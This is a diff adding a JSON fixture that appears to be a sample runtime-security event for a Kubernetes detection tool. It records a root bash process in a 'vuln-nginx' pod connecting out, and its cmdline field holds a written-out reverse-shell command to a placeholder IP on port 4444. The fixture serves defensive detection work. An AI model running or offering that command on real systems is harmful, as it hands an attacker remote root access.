@@ -1,0 +1,37 @@
+{
+  "ts": "2026-01-10T21:12:38.789Z",
+  "cluster_id": "kind-local",
+  "node_id": "kind-worker",
+  "event_type": "network_connect",
+  "event_id": "evt-revshell-001",
+  "process": {
+    "pid": 12345,
+    "ppid": 1,
+    "uid": 0,
+    "gid": 0,
+    "exe": "/bin/bash",
+    "cmdline": "bash -i >& /dev/tcp/203.0.113.50/4444 0>&1",
+    "cwd": "/",
+    "has_tty": true,
+    "capabilities_added": []
+  },
+  "container": {
+    "container_id": "containerd://abc123def456",
+    "image": "nginx:1.25",
+    "image_digest": "sha256:abcdef123456",
+    "pod": "vuln-nginx-7c9b",
+    "namespace": "prod",
+    "service_account": "default",
+    "labels": {
+      "app": "vuln-nginx",
+      "env": "prod"
+    }
+  },
+  "network": {
+    "dst_ip": "203.0.113.50",
+    "dst_port": 4444,
+    "proto": "tcp",
+    "dst_domain": ""
+  },
+  "raw_ref": "s3://kubeguard-raw/raw/kind-local/2026-01-10/kind-worker/21/event.jsonl.gz#offset=2048"
+}
